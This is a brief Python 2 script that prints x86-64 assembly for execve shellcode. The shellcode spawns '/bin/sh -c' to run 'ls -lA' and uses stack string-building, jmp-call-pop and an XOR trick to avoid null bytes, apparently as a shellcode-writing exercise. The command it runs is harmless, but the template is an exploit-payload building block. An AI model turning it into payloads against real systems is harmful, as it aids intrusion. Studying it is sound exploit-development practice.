#!/usr/bin/python2

import sys

shellcode           =   "section .text\n" + \
                        "global _start\n" + \
                        "_start:\n" + \
                        "xor     rcx, rcx\n" + \
                        "push    rcx\n" + \
                        "mov     rcx, 0x68732f6e69622fff\n" + \
                        "shr     rcx, 0x8\n" + \
                        "push    rcx\n" + \
                        "push    rsp\n" + \
                        "pop     rdi\n" + \
                        "xor     rcx, rcx\n" + \
                        "push    rcx\n" + \
                        "push    word 0x632d\n" + \
                        "push    rsp\n" + \
                        "pop     rbx\n" + \
                        "xor     rcx, rcx\n" + \
                        "push    rcx\n" + \
                        "jmp     command\n" + \
                        "execve:\n" + \
                        "pop     rdx\n" + \
                        "push    rdx\n" + \
                        "xor     byte [rdx+0x5], 0x41\n" + \
                        "push    rbx\n" + \
                        "push    rdi\n" + \
                        "push    rsp\n" + \
                        "pop     rsi\n" + \
                        "xor     rdx, rdx\n" + \
                        "mov     al, 0x3B\n" + \
                        "syscall\n" + \
                        "command:\n" + \
                        "call    execve\n" + \
                        'data:   db "ls -lA"\n'

shellcode_length    = 0

print(shellcode)
print("\nLength: " + str(shellcode_length))
